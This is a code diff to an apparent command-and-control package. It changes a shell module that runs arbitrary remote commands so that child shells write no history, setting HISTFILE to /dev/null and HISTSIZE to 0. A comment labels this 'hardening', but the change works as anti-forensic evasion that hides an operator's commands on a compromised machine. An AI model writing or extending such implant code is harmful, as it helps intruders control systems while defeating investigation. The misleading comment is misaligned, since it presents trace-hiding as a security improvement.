@@ -2,6 +2,7 @@ package c2
 
 import (
 	"context"
+	"os"
 	"os/exec"
 	"time"
 
@@ -24,6 +25,10 @@ func (m *ShellModule) Execute(args map[string]interface{}) (string, string) {
 	defer cancel()
 
 	cmd := exec.CommandContext(ctx, "sh", "-c", cmdStr)
+	// Harden the child environment so any interactive-ish shell spawned
+	// cannot write history. Later entries win on Unix exec; on Windows
+	// these are harmless no-ops.
+	cmd.Env = append(os.Environ(), "HISTFILE=/dev/null", "HISTSIZE=0")
 	output, err := cmd.CombinedOutput()
 
 	if ctx.Err() == context.DeadlineExceeded {
